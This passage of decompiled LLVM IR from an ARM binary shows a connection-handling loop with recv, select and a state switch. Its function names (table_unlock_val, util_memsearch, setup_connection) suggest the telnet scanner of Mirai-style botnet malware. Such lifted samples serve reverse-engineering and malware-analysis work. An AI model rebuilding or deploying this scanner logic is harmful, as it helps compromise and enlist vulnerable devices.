  store i1 %v9_10a70, i1* %cpsr_z.global-to-local, align 1
  %v2_10a74 = xor i1 %v3_10a70, true
  %v3_10a74 = or i1 %v9_10a70, %v2_10a74
  br i1 %v3_10a74, label %dec_label_pc_109e4, label %dec_label_pc_10a78

dec_label_pc_10a78:                               ; preds = %dec_label_pc_10a60
  %v1_10a78 = add i32 %v2_10a44, 4
  %v2_10a78 = inttoptr i32 %v1_10a78 to i32*
  %v3_10a78 = load i32, i32* %v2_10a78, align 4
  store i32 %v3_10a78, i32* %r0.global-to-local, align 4
  %v1_10a7c = call i32 @__GI___libc_close(i32 %v3_10a78)
  store i32 %v1_10a7c, i32* %r0.global-to-local, align 4
  %v0_10a80 = load i32, i32* @r4, align 4
  %v1_10a80 = add i32 %v0_10a80, 12
  %v2_10a80 = inttoptr i32 %v1_10a80 to i32*
  %v3_10a80 = load i32, i32* %v2_10a80, align 4
  store i32 %v3_10a80, i32* %r3.global-to-local, align 4
  %v2_10a84 = icmp ugt i32 %v3_10a80, 1
  store i1 %v2_10a84, i1* %cpsr_c.global-to-local, align 1
  %v7_10a84 = icmp eq i32 %v3_10a80, 2
  store i1 %v7_10a84, i1* %cpsr_z.global-to-local, align 1
  %v2_10a88 = xor i1 %v2_10a84, true
  %v3_10a88 = or i1 %v7_10a84, %v2_10a88
  br i1 %v3_10a88, label %bb376, label %.thread269

.thread269:                                       ; preds = %dec_label_pc_10a78
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_10a90266270 = add i32 %v0_10a80, 4
  %v3_10a90267271 = inttoptr i32 %v2_10a90266270 to i32*
  store i32 -1, i32* %v3_10a90267271, align 4
  br label %bb377

bb376:                                            ; preds = %dec_label_pc_10a78
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_10a90263 = add i32 %v0_10a80, 4
  %v3_10a90264 = inttoptr i32 %v2_10a90263 to i32*
  store i32 -1, i32* %v3_10a90264, align 4
  %v4_10a94 = load i32, i32* %r3.global-to-local, align 4
  %v5_10a94 = load i32, i32* @r4, align 4
  %v6_10a94 = add i32 %v5_10a94, 12
  %v7_10a94 = inttoptr i32 %v6_10a94 to i32*
  store i32 %v4_10a94, i32* %v7_10a94, align 4
  %v4_10a98 = load i32, i32* %r3.global-to-local, align 4
  %v5_10a98 = trunc i32 %v4_10a98 to i8
  %v6_10a98 = load i32, i32* @r4, align 4
  %v7_10a98 = add i32 %v6_10a98, 540
  %v8_10a98 = inttoptr i32 %v7_10a98 to i8*
  store i8 %v5_10a98, i8* %v8_10a98, align 1
  %v0_10a9c.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_10a9c.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb377

bb377:                                            ; preds = %.thread269, %bb376
  %v1_10a9c = phi i1 [ %v1_10a9c.pre, %bb376 ], [ %v2_10a84, %.thread269 ]
  %v0_10a9c = phi i1 [ %v0_10a9c.pre, %bb376 ], [ false, %.thread269 ]
  %v2_10a9c = xor i1 %v1_10a9c, true
  %v3_10a9c = or i1 %v0_10a9c, %v2_10a9c
  br i1 %v3_10a9c, label %bb371, label %dec_label_pc_10aa0

dec_label_pc_10aa0:                               ; preds = %bb377
  %v0_10aa0 = load i32, i32* @r4, align 4
  %v1_10aa0 = add i32 %v0_10aa0, 540
  %v2_10aa0 = inttoptr i32 %v1_10aa0 to i8*
  %v3_10aa0 = load i8, i8* %v2_10aa0, align 1
  %v4_10aa0 = zext i8 %v3_10aa0 to i32
  %v1_10aa4 = add nuw nsw i32 %v4_10aa0, 1
  %v1_10aa8 = urem i32 %v1_10aa4, 256
  store i32 %v1_10aa8, i32* %r3.global-to-local, align 4
  %v2_10aac = icmp ugt i32 %v1_10aa8, 9
  store i1 %v2_10aac, i1* %cpsr_c.global-to-local, align 1
  %v7_10aac = icmp eq i32 %v1_10aa8, 10
  store i1 %v7_10aac, i1* %cpsr_z.global-to-local, align 1
  %v1_10ab0 = trunc i32 %v1_10aa4 to i8
  store i8 %v1_10ab0, i8* %v2_10aa0, align 1
  %v0_10ab4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10ab4, label %.thread57, label %dec_label_pc_10ac4

.thread57:                                        ; preds = %dec_label_pc_10aa0
  %v1_10ab4 = load i32, i32* %r3.global-to-local, align 4
  %v2_10ab4 = add i32 %v1_10ab4, -10
  store i32 %v2_10ab4, i32* %r3.global-to-local, align 4
  %v2_10ab8 = load i32, i32* @r4, align 4
  %v3_10ab8 = add i32 %v2_10ab8, 12
  %v4_10ab8 = inttoptr i32 %v3_10ab8 to i32*
  store i32 %v2_10ab4, i32* %v4_10ab8, align 4
  %v1_10abc = load i32, i32* %r3.global-to-local, align 4
  %v2_10abc = trunc i32 %v1_10abc to i8
  %v3_10abc = load i32, i32* @r4, align 4
  %v4_10abc = add i32 %v3_10abc, 540
  %v5_10abc = inttoptr i32 %v4_10abc to i8*
  store i8 %v2_10abc, i8* %v5_10abc, align 1
  %v0_10ac0.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10ac0.pr.pr, label %bb371, label %dec_label_pc_10ac4

dec_label_pc_10ac4:                               ; preds = %dec_label_pc_10aa0, %.thread57
  %v0_10ac4 = load i32, i32* @r4, align 4
  store i32 %v0_10ac4, i32* @r0, align 4
  %v0_10ac8 = call i32 @setup_connection()
  store i32 %v0_10ac8, i32* %r0.global-to-local, align 4
  br label %bb371

dec_label_pc_10ad0:                               ; preds = %bb371
  store i32 0, i32* @r4, align 4
  store i32 1, i32* %stack_var_-68, align 4
  %v0_10adc = load i32, i32* @r5, align 4
  %v1_10adc = load i32, i32* @r6, align 4
  %v3_10adc = icmp uge i32 %v0_10adc, %v1_10adc
  store i1 %v3_10adc, i1* %cpsr_c.global-to-local, align 1
  %v9_10adc = icmp eq i32 %v0_10adc, %v1_10adc
  store i1 %v9_10adc, i1* %cpsr_z.global-to-local, align 1
  %v5_10ae0 = icmp slt i32 %v0_10adc, %v1_10adc
  %storemerge128 = select i1 %v5_10ae0, i32 %v1_10adc, i32 %v0_10adc
  %v2_10af4 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_10af4, i32* %ip.global-to-local, align 4
  %v2_10af8 = ptrtoint i32* %stack_var_-224 to i32
  store i32 %v2_10af8, i32* %r1.global-to-local, align 4
  %v2_10afc = ptrtoint i32* %stack_var_-352 to i32
  store i32 %v2_10afc, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10b04 = add i32 %storemerge128, 1
  store i32 %v1_10b04, i32* %r0.global-to-local, align 4
  %v5_10b10 = call i32 @__libc_select(i32 %v1_10b04, i32 %v2_10af8, i32 %v2_10afc, i32 0, i32 %v2_10af4)
  %v0_10b14 = load i32, i32* @r4, align 4
  store i32 %v0_10b14, i32* %r0.global-to-local, align 4
  %v1_10b18 = inttoptr i32 %v0_10b14 to i32*
  %v2_10b18 = call i32 @__GI_time(i32* %v1_10b18)
  store i32 %v2_10b18, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24388.186 to i32), i32* @lr, align 4
  %v0_10b20 = load i32, i32* @r4, align 4
  store i32 %v0_10b20, i32* %stack_var_-52, align 4
  store i32 %v2_10b18, i32* @global_var_24388.186, align 4
  %v2_10bac = inttoptr i32 %stack_var_-1876.0 to i32*
  %v2_114a8 = ptrtoint i32* %stack_var_-45 to i32
  %v2_114bc = ptrtoint i32* %stack_var_-77 to i32
  %v2_1124c = ptrtoint i32* %stack_var_-60 to i32
  %v2_115ec = ptrtoint i32* %stack_var_-104 to i32
  %v2_11818 = ptrtoint i32* %stack_var_-96 to i32
  %v2_11844 = ptrtoint i32* %stack_var_-56 to i32
  %v2_11870 = ptrtoint i32* %stack_var_-42 to i32
  br label %dec_label_pc_10b28

dec_label_pc_10b28:                               ; preds = %dec_label_pc_10c98, %dec_label_pc_10ad0
  %v0_10b34 = phi i32 [ %v1_10c9c, %dec_label_pc_10c98 ], [ %v0_10b20, %dec_label_pc_10ad0 ]
  store i32 ptrtoint (i32* @global_var_26e6c.197 to i32), i32* %r0.global-to-local, align 4
  %v3_10b2c = mul i32 %v0_10b34, 512
  store i32 %v3_10b2c, i32* %r3.global-to-local, align 4
  %v2_10b30 = load i32, i32* @global_var_26e6c.197, align 4
  store i32 %v2_10b30, i32* %r1.global-to-local, align 4
  %v2_10b38 = mul i32 %v0_10b34, 544
  store i32 %v2_10b38, i32* %r2.global-to-local, align 4
  %v2_10b3c = add i32 %v2_10b30, %v2_10b38
  store i32 %v2_10b3c, i32* @r6, align 4
  %v1_10b40 = add i32 %v2_10b3c, 4
  %v2_10b40 = inttoptr i32 %v1_10b40 to i32*
  %v3_10b40 = load i32, i32* %v2_10b40, align 4
  store i32 %v3_10b40, i32* %r0.global-to-local, align 4
  %v2_10b44 = icmp eq i32 %v3_10b40, -1
  store i1 %v2_10b44, i1* %cpsr_c.global-to-local, align 1
  %v7_10b44 = icmp eq i32 %v3_10b40, -1
  store i1 %v7_10b44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10b44, label %dec_label_pc_10c98, label %dec_label_pc_10b4c

dec_label_pc_10b4c:                               ; preds = %dec_label_pc_10b28
  %v3_10b4c = udiv i32 %v3_10b40, 32
  store i32 %v2_11914, i32* %r1.global-to-local, align 4
  %v3_10b54 = mul nuw nsw i32 %v3_10b4c, 4
  store i32 %v3_10b54, i32* @ip, align 4
  %v2_10b58 = add i32 %v3_10b54, %v2_11914
  store i32 %v2_10b58, i32* %r2.global-to-local, align 4
  %v1_10b5c = add i32 %v2_10b58, -312
  %v2_10b5c = inttoptr i32 %v1_10b5c to i32*
  %v3_10b5c = load i32, i32* %v2_10b5c, align 4
  %v1_10b60 = urem i32 %v3_10b40, 32
  store i32 %v1_10b60, i32* %r1.global-to-local, align 4
  %v2_10b64 = add nsw i32 %v1_10b60, -1
  %v3_10b64 = shl i32 1, %v2_10b64
  %v4_10b64 = and i32 %v3_10b5c, %v3_10b64
  %v5_10b64 = icmp ne i32 %v4_10b64, 0
  store i1 %v5_10b64, i1* %cpsr_c.global-to-local, align 1
  %v6_10b64 = ashr i32 %v3_10b5c, %v1_10b60
  store i32 %v6_10b64, i32* %r3.global-to-local, align 4
  %v1_10b68 = urem i32 %v6_10b64, 2
  %v2_10b68 = icmp eq i32 %v1_10b68, 0
  store i1 %v2_10b68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10b68, label %dec_label_pc_10b70, label %dec_label_pc_116d4

dec_label_pc_10b70:                               ; preds = %dec_label_pc_10b4c, %dec_label_pc_11780
  %v1_10b7c = phi i32 [ %v1_10b60, %dec_label_pc_10b4c ], [ %v1_10b7c.pre, %dec_label_pc_11780 ]
  %v0_10b74 = phi i32 [ %v3_10b54, %dec_label_pc_10b4c ], [ %v0_10b74.pre, %dec_label_pc_11780 ]
  store i32 %v2_11914, i32* @lr, align 4
  %v2_10b74 = add i32 %v0_10b74, %v2_11914
  store i32 %v2_10b74, i32* %r2.global-to-local, align 4
  %v1_10b78 = add i32 %v2_10b74, -184
  %v2_10b78 = inttoptr i32 %v1_10b78 to i32*
  %v3_10b78 = load i32, i32* %v2_10b78, align 4
  %v2_10b7c = add i32 %v1_10b7c, -1
  %v3_10b7c = shl i32 1, %v2_10b7c
  %v4_10b7c = and i32 %v3_10b78, %v3_10b7c
  %v5_10b7c = icmp ne i32 %v4_10b7c, 0
  store i1 %v5_10b7c, i1* %cpsr_c.global-to-local, align 1
  %v6_10b7c = ashr i32 %v3_10b78, %v1_10b7c
  store i32 %v6_10b7c, i32* %r3.global-to-local, align 4
  %v1_10b80 = urem i32 %v6_10b7c, 2
  %v2_10b80 = icmp eq i32 %v1_10b80, 0
  store i1 %v2_10b80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10b80, label %dec_label_pc_10c98, label %dec_label_pc_10b88.preheader

dec_label_pc_10b88.preheader:                     ; preds = %dec_label_pc_10b70
  %v0_10b88151 = load i32, i32* @r6, align 4
  %v1_10b88152 = add i32 %v0_10b88151, 12
  %v2_10b88153 = inttoptr i32 %v1_10b88152 to i32*
  %v3_10b88154 = load i32, i32* %v2_10b88153, align 4
  store i32 %v3_10b88154, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10b8c150156 = icmp eq i32 %v3_10b88154, 0
  store i1 %v2_10b8c150156, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10b8c150156, label %dec_label_pc_10c98, label %dec_label_pc_10b94.lr.ph

dec_label_pc_10b88.loopexit:                      ; preds = %dec_label_pc_11590, %dec_label_pc_113ac, %dec_label_pc_11334, %dec_label_pc_118e4
  %v0_10b88 = load i32, i32* @r6, align 4
  %v1_10b88 = add i32 %v0_10b88, 12
  %v2_10b88 = inttoptr i32 %v1_10b88 to i32*
  %v3_10b88 = load i32, i32* %v2_10b88, align 4
  store i32 %v3_10b88, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10b8c150 = icmp eq i32 %v3_10b88, 0
  store i1 %v2_10b8c150, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10b8c150, label %dec_label_pc_10c98, label %dec_label_pc_10b94.lr.ph

dec_label_pc_10b94.lr.ph:                         ; preds = %dec_label_pc_10b88.preheader, %dec_label_pc_10b88.loopexit
  %v0_10b94182 = phi i32 [ %v0_10b88, %dec_label_pc_10b88.loopexit ], [ %v0_10b88151, %dec_label_pc_10b88.preheader ]
  br label %dec_label_pc_10b94

dec_label_pc_10b8cthread-pre-split.thread:        ; preds = %dec_label_pc_10d50, %dec_label_pc_10e24, %dec_label_pc_11018, %dec_label_pc_110ec, %dec_label_pc_111c0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10b94

dec_label_pc_10b8cthread-pre-split.thread514:     ; preds = %dec_label_pc_11224, %dec_label_pc_1107c, %dec_label_pc_10fa8, %dec_label_pc_11150, %dec_label_pc_10db4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10b94

dec_label_pc_10b8cthread-pre-split:               ; preds = %dec_label_pc_10c0c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10b8c = icmp eq i32 %v3_10c0c, 0
  store i1 %v2_10b8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10b8c, label %dec_label_pc_10c98, label %dec_label_pc_10b94

dec_label_pc_10b94:                               ; preds = %dec_label_pc_10b8cthread-pre-split.thread, %dec_label_pc_10b8cthread-pre-split, %dec_label_pc_10b8cthread-pre-split.thread514, %dec_label_pc_10b94.lr.ph
  %v0_11680 = phi i32 [ %v0_10b94182, %dec_label_pc_10b94.lr.ph ], [ %v0_10c0c, %dec_label_pc_10b8cthread-pre-split.thread514 ], [ %v0_10c0c, %dec_label_pc_10b8cthread-pre-split ], [ %v0_10c0c, %dec_label_pc_10b8cthread-pre-split.thread ]
  %v1_10b94 = add i32 %v0_11680, 24
  %v2_10b94 = inttoptr i32 %v1_10b94 to i32*
  %v3_10b94 = load i32, i32* %v2_10b94, align 4
  store i32 %v3_10b94, i32* @r3, align 4
  %v2_10b98 = icmp ugt i32 %v3_10b94, 511
  store i1 %v2_10b98, i1* %cpsr_c.global-to-local, align 1
  %v7_10b98 = icmp eq i32 %v3_10b94, 512
  store i1 %v7_10b98, i1* %cpsr_z.global-to-local, align 1
  %.pre = add i32 %v0_11680, 28
  store i32 %.pre, i32* @fp, align 4
  br i1 %v7_10b98, label %dec_label_pc_11680, label %dec_label_pc_10ba4

dec_label_pc_10ba4:                               ; preds = %dec_label_pc_10b94, %dec_label_pc_11680
  store i32 %stack_var_-1876.0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* %v2_10bac, align 4
  %v0_10bb0 = load i32, i32* @r6, align 4
  %v1_10bb0 = add i32 %v0_10bb0, 24
  %v2_10bb0 = inttoptr i32 %v1_10bb0 to i32*
  %v3_10bb0 = load i32, i32* %v2_10bb0, align 4
  store i32 %v3_10bb0, i32* %r2.global-to-local, align 4
  %v0_10bb4 = load i32, i32* @fp, align 4
  %v2_10bb4 = add i32 %v0_10bb4, %v3_10bb0
  store i32 %v2_10bb4, i32* @r4, align 4
  %v1_10bb8 = add i32 %v0_10bb0, 4
  %v2_10bb8 = inttoptr i32 %v1_10bb8 to i32*
  %v3_10bb8 = load i32, i32* %v2_10bb8, align 4
  store i32 %v3_10bb8, i32* %r0.global-to-local, align 4
  %v1_10bbc = sub i32 512, %v3_10bb0
  store i32 %v1_10bbc, i32* %r2.global-to-local, align 4
  store i32 %v2_10bb4, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_10bc8 = call i32 @__libc_recv(i32 %v3_10bb8, i32 %v2_10bb4, i32 %v1_10bbc, i32 16384)
  store i32 %v4_10bc8, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10bcc = icmp eq i32 %v4_10bc8, 0
  store i1 %v2_10bcc, i1* %cpsr_z.global-to-local, align 1
  %tmp378 = icmp slt i32 %v4_10bc8, 1
  br i1 %tmp378, label %dec_label_pc_10c44, label %dec_label_pc_10bd4

dec_label_pc_10bd4:                               ; preds = %dec_label_pc_10ba4
  %v0_10bd4 = load i32, i32* @r5, align 4
  store i32 %v0_10bd4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10bd8

dec_label_pc_10bd8:                               ; preds = %.thread64, %dec_label_pc_10bd4
  %v3_10be4 = phi i32 [ %v1_10be8, %.thread64 ], [ %v0_10bd4, %dec_label_pc_10bd4 ]
  %v1_10bd8 = load i32, i32* @r4, align 4
  %v2_10bd8 = add i32 %v1_10bd8, %v3_10be4
  %v3_10bd8 = inttoptr i32 %v2_10bd8 to i8*
  %v4_10bd8 = load i8, i8* %v3_10bd8, align 1
  %v6_10bd8 = zext i8 %v4_10bd8 to i32
  store i32 %v6_10bd8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10bdc = icmp eq i8 %v4_10bd8, 0
  store i1 %v2_10bdc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10bdc, label %bb379, label %.thread64

bb379:                                            ; preds = %dec_label_pc_10bd8
  %v2_10be0 = add nuw nsw i32 %v6_10bd8, 65
  store i32 %v2_10be0, i32* %r3.global-to-local, align 4
  %v2_10be4 = trunc i32 %v2_10be0 to i8
  store i8 %v2_10be4, i8* %v3_10bd8, align 1
  %v0_10be8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %.thread64

.thread64:                                        ; preds = %dec_label_pc_10bd8, %bb379
  %v0_10be8 = phi i32 [ %v3_10be4, %dec_label_pc_10bd8 ], [ %v0_10be8.pre, %bb379 ]
  %v1_10be8 = add i32 %v0_10be8, 1
  store i32 %v1_10be8, i32* %r2.global-to-local, align 4
  %v3_10bec = icmp uge i32 %v1_10be8, %v4_10bc8
  store i1 %v3_10bec, i1* %cpsr_c.global-to-local, align 1
  %v9_10bec = icmp eq i32 %v1_10be8, %v4_10bc8
  store i1 %v9_10bec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_10bec, label %dec_label_pc_10bf4, label %dec_label_pc_10bd8

dec_label_pc_10bf4:                               ; preds = %.thread64, %dec_label_pc_10c48
  store i32 ptrtoint (i32* @global_var_24388.186 to i32), i32* @ip, align 4
  %v0_10bf8 = load i32, i32* @r6, align 4
  %v1_10bf8 = add i32 %v0_10bf8, 24
  %v2_10bf8 = inttoptr i32 %v1_10bf8 to i32*
  %v3_10bf8 = load i32, i32* %v2_10bf8, align 4
  %v2_10bfc = load i32, i32* @global_var_24388.186, align 4
  store i32 %v2_10bfc, i32* %r2.global-to-local, align 4
  %v2_10c00 = add i32 %v3_10bf8, %v4_10bc8
  store i32 %v2_10c00, i32* %r3.global-to-local, align 4
  store i32 %v2_10c00, i32* %v2_10bf8, align 4
  %v0_10c08 = load i32, i32* %r2.global-to-local, align 4
  %v1_10c08 = load i32, i32* @r6, align 4
  %v2_10c08 = add i32 %v1_10c08, 8
  %v3_10c08 = inttoptr i32 %v2_10c08 to i32*
  store i32 %v0_10c08, i32* %v3_10c08, align 4
  br label %dec_label_pc_10c0c

dec_label_pc_10c0c:                               ; preds = %dec_label_pc_10d28, %dec_label_pc_10bf4
  %v0_10c0c = load i32, i32* @r6, align 4
  %v1_10c0c = add i32 %v0_10c0c, 12
  %v2_10c0c = inttoptr i32 %v1_10c0c to i32*
  %v3_10c0c = load i32, i32* %v2_10c0c, align 4
  store i32 %v3_10c0c, i32* %r0.global-to-local, align 4
  %v1_10c10 = add i32 %v3_10c0c, -2
  store i32 %v1_10c10, i32* @r3, align 4
  %v7_10c14 = icmp eq i32 %v1_10c10, 8
  store i1 %v7_10c14, i1* %cpsr_z.global-to-local, align 1
  %v5_10c18 = and i32 %v1_10c10, 1073741824
  %v6_10c18 = icmp ne i32 %v5_10c18, 0
  store i1 %v6_10c18, i1* %cpsr_c.global-to-local, align 1
  switch i32 %v3_10c0c, label %dec_label_pc_10b8cthread-pre-split [
    i32 2, label %dec_label_pc_113d4
    i32 3, label %dec_label_pc_11294
    i32 4, label %dec_label_pc_11340
    i32 5, label %dec_label_pc_111c0
    i32 6, label %dec_label_pc_11018
    i32 7, label %dec_label_pc_10e24
    i32 8, label %dec_label_pc_110ec
    i32 9, label %dec_label_pc_10d50
    i32 10, label %dec_label_pc_10cb0
  ]

dec_label_pc_10c44:                               ; preds = %dec_label_pc_10ba4
  br i1 %v2_10bcc, label %dec_label_pc_11938, label %dec_label_pc_10c48

dec_label_pc_10c48:                               ; preds = %dec_label_pc_10c44
  %v3_10c48 = icmp eq i32 %v4_10bc8, -1
  store i1 %v3_10c48, i1* %cpsr_c.global-to-local, align 1
  %v8_10c48 = icmp eq i32 %v4_10bc8, -1
  store i1 %v8_10c48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_10c48, label %dec_label_pc_10c50, label %dec_label_pc_10bf4

dec_label_pc_10c50:                               ; preds = %dec_label_pc_10c48
  store i32 %stack_var_-1876.0, i32* %r2.global-to-local, align 4
  %v2_10c54 = load i32, i32* %v2_10bac, align 4
  store i32 %v2_10c54, i32* %r3.global-to-local, align 4
  %v2_10c58 = icmp ugt i32 %v2_10c54, 10
  store i1 %v2_10c58, i1* %cpsr_c.global-to-local, align 1
  %v7_10c58 = icmp eq i32 %v2_10c54, 11
  store i1 %v7_10c58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10c58, label %dec_label_pc_10c98, label %dec_label_pc_10c60

dec_label_pc_10c60:                               ; preds = %dec_label_pc_10c50, %dec_label_pc_11938
  %v0_10c60 = load i32, i32* @r6, align 4
  %v1_10c60 = add i32 %v0_10c60, 4
  %v2_10c60 = inttoptr i32 %v1_10c60 to i32*
  %v3_10c60 = load i32, i32* %v2_10c60, align 4
  store i32 %v3_10c60, i32* %r0.global-to-local, align 4
  %v1_10c64 = call i32 @__GI___libc_close(i32 %v3_10c60)
  store i32 %v1_10c64, i32* %r0.global-to-local, align 4
  %v0_10c68 = load i32, i32* @r6, align 4
  %v1_10c68 = add i32 %v0_10c68, 540
  %v2_10c68 = inttoptr i32 %v1_10c68 to i8*
  %v3_10c68 = load i8, i8* %v2_10c68, align 1
  %v4_10c68 = zext i8 %v3_10c68 to i32
  %v1_10c6c = add nuw nsw i32 %v4_10c68, 1
  %v1_10c70 = urem i32 %v1_10c6c, 256
  store i32 %v1_10c70, i32* %r3.global-to-local, align 4
  %v2_10c74 = icmp ugt i32 %v1_10c70, 8
  store i1 %v2_10c74, i1* %cpsr_c.global-to-local, align 1
  %v7_10c74 = icmp eq i32 %v1_10c70, 9
  store i1 %v7_10c74, i1* %cpsr_z.global-to-local, align 1
  %v1_10c78 = trunc i32 %v1_10c6c to i8
  store i8 %v1_10c78, i8* %v2_10c68, align 1
  store i32 -1, i32* %r2.global-to-local, align 4
  %v0_10c80 = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_10c80 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v2_10c80 = xor i1 %v1_10c80, true
  %v3_10c80 = and i1 %v0_10c80, %v2_10c80
  br i1 %v3_10c80, label %bb380, label %.thread283

.thread283:                                       ; preds = %dec_label_pc_10c60
  %v1_10c84279284 = load i32, i32* @r6, align 4
  %v2_10c84280285 = add i32 %v1_10c84279284, 4
  %v3_10c84281286 = inttoptr i32 %v2_10c84280285 to i32*
  store i32 -1, i32* %v3_10c84281286, align 4
  br label %bb381

bb380:                                            ; preds = %dec_label_pc_10c60
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10c84275 = load i32, i32* @r6, align 4
  %v2_10c84276 = add i32 %v1_10c84275, 4
  %v3_10c84277 = inttoptr i32 %v2_10c84276 to i32*
  store i32 -1, i32* %v3_10c84277, align 4
  %v4_10c88 = load i32, i32* %r3.global-to-local, align 4
  %v5_10c88 = load i32, i32* @r6, align 4
  %v6_10c88 = add i32 %v5_10c88, 12
  %v7_10c88 = inttoptr i32 %v6_10c88 to i32*
  store i32 %v4_10c88, i32* %v7_10c88, align 4
  %v4_10c8c = load i32, i32* %r3.global-to-local, align 4
  %v5_10c8c = trunc i32 %v4_10c8c to i8
  %v6_10c8c = load i32, i32* @r6, align 4
  %v7_10c8c = add i32 %v6_10c8c, 540
  %v8_10c8c = inttoptr i32 %v7_10c8c to i8*
  store i8 %v5_10c8c, i8* %v8_10c8c, align 1
  %v0_10c90.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_10c90.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb381

bb381:                                            ; preds = %.thread283, %bb380
  %v1_10c94 = phi i1 [ %v1_10c90.pre, %bb380 ], [ %v0_10c80, %.thread283 ]
  %v0_10c94 = phi i1 [ %v0_10c90.pre, %bb380 ], [ %v1_10c80, %.thread283 ]
  %v2_10c90 = xor i1 %v1_10c94, true
  %v3_10c90 = or i1 %v0_10c94, %v2_10c90
  br i1 %v3_10c90, label %bb382, label %bb383

bb382:                                            ; preds = %bb381
  %v4_10c90 = load i32, i32* @r6, align 4
  store i32 %v4_10c90, i32* %r0.global-to-local, align 4
  br label %bb383

bb383:                                            ; preds = %bb381, %bb382
  store i32 68760, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10c90, i32 ptrtoint (i32* @global_var_fcbc.329 to i32))
  br label %dec_label_pc_10c98

dec_label_pc_10c98:                               ; preds = %dec_label_pc_10b88.loopexit, %dec_label_pc_10b8cthread-pre-split, %dec_label_pc_10b88.preheader, %dec_label_pc_10c50, %dec_label_pc_10b70, %dec_label_pc_10b28, %dec_label_pc_117a0, %bb383
  %v3_10c98 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_10c98, i32* %r3.global-to-local, align 4
  %v1_10c9c = add i32 %v3_10c98, 1
  store i32 %v1_10c9c, i32* @r4, align 4
  %v2_10ca0 = icmp ugt i32 %v1_10c9c, 254
  store i1 %v2_10ca0, i1* %cpsr_c.global-to-local, align 1
  %v7_10ca0 = icmp eq i32 %v1_10c9c, 255
  store i1 %v7_10ca0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_10c9c, i32* %stack_var_-52, align 4
  %v7_10ca8 = icmp slt i32 %v1_10c9c, 256
  br i1 %v7_10ca8, label %dec_label_pc_10b28, label %dec_label_pc_10544

dec_label_pc_10cb0:                               ; preds = %dec_label_pc_10c0c
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_10cb4 = call i32 @table_unlock_val(i32 26)
  store i32 %v2_1124c, i32* %r1.global-to-local, align 4
  store i32 26, i32* %r0.global-to-local, align 4
  %v3_10cc4 = call i32 @table_retrieve_val(i32 26, i32* nonnull %stack_var_-60)
  %v3_10cc8 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_10cc4, i32* %r2.global-to-local, align 4
  %v1_10cd0 = add i32 %v3_10cc8, -1
  store i32 %v1_10cd0, i32* %r3.global-to-local, align 4
  %v0_10cd4 = load i32, i32* @fp, align 4
  store i32 %v0_10cd4, i32* %r0.global-to-local, align 4
  %v0_10cd8 = load i32, i32* @r6, align 4
  %v1_10cd8 = add i32 %v0_10cd8, 24
  %v2_10cd8 = inttoptr i32 %v1_10cd8 to i32*
  %v3_10cd8 = load i32, i32* %v2_10cd8, align 4
  store i32 %v3_10cd8, i32* %r1.global-to-local, align 4
  %v4_10cdc = call i32 @util_memsearch(i32 %v0_10cd4, i32 %v3_10cd8, i32 %v3_10cc4, i32 %v1_10cd0)
  %v2_10ce0 = icmp eq i32 %v4_10cdc, -1
  store i1 %v2_10ce0, i1* %cpsr_c.global-to-local, align 1
  %v7_10ce0 = icmp eq i32 %v4_10cdc, -1
  store i1 %v7_10ce0, i1* %cpsr_z.global-to-local, align 1
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_11594 = call i32 @table_lock_val(i32 26)
  br i1 %v7_10ce0, label %dec_label_pc_11590, label %dec_label_pc_10ce8

dec_label_pc_10ce8:                               ; preds = %dec_label_pc_10cb0
  store i32 %v1_11594, i32* %r0.global-to-local, align 4
  %v0_10cf0 = load i32, i32* @r6, align 4
  %v1_10cf0 = add i32 %v0_10cf0, 4
  %v2_10cf0 = inttoptr i32 %v1_10cf0 to i32*
  %v3_10cf0 = load i32, i32* %v2_10cf0, align 4
  store i32 %v3_10cf0, i32* %r0.global-to-local, align 4
  %v1_10cf4 = call i32 @__GI___libc_close(i32 %v3_10cf0)
